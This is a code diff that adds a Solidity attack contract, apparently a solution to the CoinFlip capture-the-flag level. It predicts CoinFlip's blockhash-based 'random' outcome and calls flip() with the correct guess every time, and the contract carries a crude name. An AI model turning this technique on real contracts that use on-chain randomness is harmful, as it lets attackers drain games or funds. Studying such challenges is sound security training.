@@ -37,3 +37,23 @@ contract CoinFlip {
         }
     }
 }
+
+contract CoinSUKA {
+    CoinFlip public coinContract;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _coin) public {
+        coinContract = CoinFlip(_coin);
+    }
+
+    function guess() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        if (side == true) {
+            coinContract.flip(true);
+        } else {
+            coinContract.flip(false);
+        }
+    }
+}
